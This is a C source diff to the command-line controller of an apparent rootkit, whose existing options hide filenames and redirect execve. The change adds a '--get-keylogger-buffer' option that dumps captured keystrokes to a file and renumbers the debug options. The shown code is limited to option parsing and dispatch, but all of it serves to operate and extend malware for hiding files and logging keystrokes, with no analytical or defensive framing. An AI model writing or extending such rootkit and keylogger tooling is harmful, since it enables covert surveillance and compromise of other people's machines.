@@ -18,8 +18,9 @@ static struct option long_options[] = {
 	{"unhide-filename", 1, 0, 8},
 	{"redirect-execve", 1, 0, 9},
 	{"unredirect-execve", 1, 0, 10},
-	{"debug-rk", 0, 0, 11},
-	{"debug-stats", 0, 0, 12},
+	{"get-keylogger-buffer", 1, 0, 11},
+	{"debug-rk", 0, 0, 12},
+	{"debug-stats", 0, 0, 13},
 	{0, 0, 0, 0}
 };
 
@@ -35,6 +36,7 @@ void usage(const char *path)
 		"\t--unhide-filename <name>\tunhide filename\n"		\
 		"\t--redirect-execve <path:new_path>\t redirect exexve\n"\
 		"\t--unredirect-execve <path:new_path>\t unredirect execve\n"\
+		"\t--get-keylogger-buffer <path>\t get keylogger buffer\n"\
 		"\t--debug-rk\t\t(for debugging purpose)\n"		\
 		"\t--debug-stats\t\t(for debugging purpose)\n"		\
 		, path);
@@ -89,9 +91,12 @@ int main(int argc, char **argv)
 			unredirect_execve(optarg);
 			break;
 		case 11:
-			anima_control(DEBUG_RK, NULL);
+			get_keylogger_buf(optarg);
 			break;
 		case 12:
+			anima_control(DEBUG_RK, NULL);
+			break;
+		case 13:
 			anima_control(DEBUG_STATS, NULL);
 			break;
 		default:
